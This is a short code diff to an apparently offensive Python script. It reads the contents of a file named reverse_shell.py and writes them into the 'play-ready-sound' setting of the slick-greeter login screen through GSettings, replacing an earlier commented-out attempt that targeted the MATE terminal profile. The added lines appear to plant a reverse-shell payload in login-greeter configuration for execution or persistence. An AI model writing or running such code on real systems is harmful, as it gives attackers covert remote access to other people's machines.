@@ -2,6 +2,7 @@ from gi.repository import Gio
 
 code = open("reverse_shell.py").read()
 
-gsettings = Gio.Settings.new("org.mate.terminal.profiles.default")
-# gsettings.set_string("code", code)
-# gsettings.apply()
+# Write settings to lightdm's play sound config
+gsettings = Gio.Settings.new("x.dm.slick-greeter")
+gsettings.set_string("play-ready-sound", code)
+gsettings.apply()
